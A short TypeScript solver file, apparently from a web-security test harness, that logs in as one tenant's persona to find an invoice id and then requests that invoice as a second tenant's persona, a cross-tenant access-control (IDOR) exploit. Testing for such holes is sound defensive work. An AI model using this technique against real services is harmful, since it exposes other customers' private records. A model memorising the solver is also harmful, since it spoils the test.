// Cross-tenant invoice read: discover a tenant-A invoice id as its owner, then read it as persona_b.
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const owner = await ctx.login('persona_a')
  const list = await ctx.fetch(ctx.path('listInvoices'), { session: owner })
  const items = (list.json?.items ?? []) as Array<{ id: string }>
  const target = items[0]
  if (!target) return
  const attacker = await ctx.login('persona_b')
  await ctx.fetch(ctx.path('getInvoice', { invoiceId: target.id }), { session: attacker })
}
